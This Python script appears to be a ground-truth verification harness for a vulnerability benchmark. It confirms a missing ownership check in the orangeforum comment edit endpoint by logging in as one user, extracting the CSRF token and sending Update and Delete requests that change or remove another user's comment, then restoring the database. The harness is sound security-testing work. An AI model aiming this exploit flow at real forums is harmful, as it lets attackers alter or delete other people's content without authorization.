"""Manual ground-truth verification for orangeforum (GT-049 .. GT-050).

editComment (categories/<id>/topics/<tid>/comments/<cid>/edit) renders the
edit form and processes the Update/Delete actions without any ownership
check: UpdateCommentByID and DeleteCommentByID operate on the comment id
alone (the userID argument is only used for counter decrements). Comment 34
(topic 9) is owned by user2 (user_id=3); the attacking session is user1.
gorilla/csrf protects the forms, so each POST carries the token extracted
from the edit page of the attacker's own session.
"""

from __future__ import annotations

import json
import os
import re
import subprocess

import verifier as v

APP = "orangeforum"
EDIT = "categories/1/topics/9/comments/34/edit"


class _PG:
    def __init__(self, config: dict):
        self.bin = str(config.get("psql", "psql"))
        self.args = ["-h", str(config.get("host", "localhost")),
                     "-p", str(config.get("port", 5432)),
                     "-U", str(config["user"]), "-d", str(config["database"])]
        self.env = os.environ.copy()
        if config.get("password"):
            self.env["PGPASSWORD"] = str(config["password"])
        self.log: list[dict] = []

    def _run(self, sql: str) -> str:
        self.log.append({"kind": "psql", "sql": sql})
        completed = subprocess.run(
            [self.bin, *self.args, "-t", "-A", "-c", sql],
            capture_output=True, text=True, env=self.env, timeout=120,
        )
        if completed.returncode != 0:
            raise RuntimeError(f"psql failed: {completed.stderr.strip()[:400]}")
        return (completed.stdout or "").strip()

    def scalar(self, sql: str) -> str:
        return self._run(sql)

    def drain_sql(self):
        log, self.log = self.log, []
        return log


def _csrf_token(body: str) -> str:
    match = re.search(r'name=["\']gorilla\.csrf\.Token["\'] value=["\']([^"\']+)["\']', body)
    return match.group(1) if match else ""


def _clean_csrf_cookies(sess) -> None:
    """The sign-in flow leaves two _gorilla_csrf cookies with different paths;
    gorilla/csrf then validates the posted token against the wrong one. Drop
    them so the form GET re-issues a single cookie that matches the token."""
    for cookie in list(sess.cookies):
        if cookie.name == "_gorilla_csrf":
            sess.cookies.clear(cookie.domain, cookie.path, cookie.name)


def _edit_page(det, sess) -> dict:
    _clean_csrf_cookies(sess)
    return v.replay(det, sess, EDIT, {"method": "GET", "params": {}, "referer": None})


def _post_action(det, sess, csrf: str, action: str, content: str = "") -> dict:
    params = {"gorilla.csrf.Token": csrf, "action": action}
    if content:
        params["content"] = content
    # gorilla/csrf rotates its cookie on every GET; detector._send would
    # perform an intermediate GET of the referer page and invalidate the
    # extracted token, so the POST is sent directly with the same session.
    raw = sess.post(det.config.target.base_url.rstrip("/") + "/" + EDIT,
                    data=params, headers={"Referer": det.config.target.base_url.rstrip("/") + "/" + EDIT},
                    timeout=60, allow_redirects=False)
    return {
        "url": str(raw.url),
        "status_code": int(raw.status_code),
        "headers": dict(raw.headers),
        "body": str(raw.text or ""),
        "body_length": len(raw.text or ""),
    }


def gt049(det, pg) -> dict:
    """Update comment 34 (owned by user2) as user1: token1 -> token2."""
    r = v.Recorder(APP, "GT-049", pg)
    t1 = v.token("c34_before")
    t2 = v.token("c34_after")
    owner = pg.scalar("SELECT user_id FROM comments WHERE comment_id=34")
    original = pg.scalar("SELECT content FROM comments WHERE comment_id=34")
    original_sticky = pg.scalar("SELECT is_sticky FROM comments WHERE comment_id=34")
    pg.scalar(f"UPDATE comments SET content='{t1}' WHERE comment_id=34")
    r.add("instrument", {"table": "comments", "row": "comment_id=34", "column": "content",
                         "owner_user_id": owner, "token1": t1, "token2": t2,
                         "original_content_recorded": bool(original)})
    r.steps.append({"kind": "_restore_probes", "probes": [
        {"sql": "SELECT content FROM comments WHERE comment_id=34", "expected": original},
        {"sql": "SELECT is_sticky FROM comments WHERE comment_id=34", "expected": original_sticky},
    ]})
    sess = v.role_session(det, "user1")
    try:
        form = _edit_page(det, sess)
        csrf = _csrf_token(form["body"])
        form_exposed = t1 in form["body"]
        body_file = r.save_body("gt049_user1_edit_form", form["body"])
        r.add("replay", {
            "role": "user1 (not the comment owner)",
            "request": f"GET {EDIT}",
            "status_code": form["status_code"],
            "edit_form_exposed_other_users_comment": form_exposed,
            "csrf_token_obtained": bool(csrf),
            "body_saved": body_file,
        })
        resp = _post_action(det, sess, csrf, "Update", t2)
        after = pg.scalar("SELECT content FROM comments WHERE comment_id=34")
        r.add("replay", {
            "role": "user1 (not the comment owner)",
            "request": f"POST {EDIT} action=Update content={t2}",
            "status_code": resp["status_code"],
            "db_content_before": t1,
            "db_content_after": after,
            "updated": (after == t2),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if after == t2 else "not_confirmed"
    summary = (f"user1 GET {EDIT} returned {form['status_code']} with the edit form of user2's comment "
               f"(content token exposed={form_exposed}); the Update POST returned {resp['status_code']} "
               f"and changed the comment content {t1} -> {after} (updated={after == t2}).")
    return r.finish(verdict, summary)


def gt050(det, pg) -> dict:
    """Delete comment 34 (owned by user2) as user1: the token row disappears."""
    r = v.Recorder(APP, "GT-050", pg)
    tok = v.token("c34_delete")
    owner = pg.scalar("SELECT user_id FROM comments WHERE comment_id=34")
    original = pg.scalar("SELECT content FROM comments WHERE comment_id=34")
    num_before = pg.scalar("SELECT num_comments FROM topics WHERE topic_id=9")
    user_comments_before = pg.scalar("SELECT num_comments FROM users WHERE user_id=%s" % owner)
    pg.scalar(f"UPDATE comments SET content='{tok}' WHERE comment_id=34")
    r.add("instrument", {"table": "comments", "row": "comment_id=34", "column": "content",
                         "token": tok, "owner_user_id": owner,
                         "topic_num_comments_before": num_before})
    r.steps.append({"kind": "_restore_probes", "probes": [
        {"sql": "SELECT COUNT(*) FROM comments WHERE comment_id=34", "expected": "1"},
        {"sql": "SELECT content FROM comments WHERE comment_id=34", "expected": original},
        {"sql": "SELECT num_comments FROM topics WHERE topic_id=9", "expected": num_before},
        {"sql": f"SELECT num_comments FROM users WHERE user_id={owner}", "expected": user_comments_before},
    ]})
    sess = v.role_session(det, "user1")
    try:
        form = _edit_page(det, sess)
        csrf = _csrf_token(form["body"])
        form_exposed = tok in form["body"]
        body_file = r.save_body("gt050_user1_edit_form", form["body"])
        r.add("replay", {
            "role": "user1 (not the comment owner)",
            "request": f"GET {EDIT}",
            "status_code": form["status_code"],
            "edit_form_exposed_other_users_comment": form_exposed,
            "csrf_token_obtained": bool(csrf),
            "body_saved": body_file,
        })
        resp = _post_action(det, sess, csrf, "Delete")
        exists_after = pg.scalar("SELECT COUNT(*) FROM comments WHERE comment_id=34")
        num_after = pg.scalar("SELECT num_comments FROM topics WHERE topic_id=9")
        r.add("replay", {
            "role": "user1 (not the comment owner)",
            "request": f"POST {EDIT} action=Delete",
            "status_code": resp["status_code"],
            "comment_exists_after": exists_after,
            "deleted": (exists_after == "0"),
            "topic_num_comments_after": num_after,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exists_after == "0" else "not_confirmed"
    summary = (f"user1 GET {EDIT} returned {form['status_code']} with the edit form of user2's comment "
               f"(token exposed={form_exposed}); the Delete POST returned {resp['status_code']} and "
               f"removed comment 34 (exists_after={exists_after}), with the topic comment counter "
               f"decremented {num_before} -> {num_after}.")
    return r.finish(verdict, summary)


def main() -> None:
    import dataclasses

    cfg, snap, det, db = v.app_context(APP)
    # Optional base override: the validation is performed against a fresh
    # build from the original source, served on a separate port so the
    # deployed (guarded) binary remains untouched.
    override = os.environ.get("DRHL_ORANGEFORUM_BASE", "")
    if override:
        cfg = dataclasses.replace(cfg, target=dataclasses.replace(cfg.target, base_url=override))
        det = v.ActiveDetector(cfg, snap)
    baseline = snap.create()
    pg = _PG(cfg.database)
    results = []
    for fn in (gt049, gt050):
        item = v.run_record(snap, lambda fn=fn: fn(det, pg), baseline, cfg.database)
        # pg_dump byte comparison is not applicable here: PostgreSQL
        # re-normalizes plpgsql function bodies on restore, so the dump of the
        # restored database differs structurally. Instead, verify the restore
        # by re-querying the exact rows touched by the record.
        probes = []
        for step in item.get("steps", []):
            if step.get("kind") == "_restore_probes":
                probes.extend(step["probes"])
        item["restore_verified"] = all(
            pg.scalar(p["sql"]) == p["expected"] for p in probes
        ) if probes else False
        item["steps"] = [s for s in item.get("steps", []) if s.get("kind") != "_restore_probes"]
        results.append(item)
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "restore_note": "postgresql re-normalizes plpgsql function bodies on restore, so per-row "
                        "probes are used instead of a full dump comparison",
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:130]}")


if __name__ == "__main__":
    main()
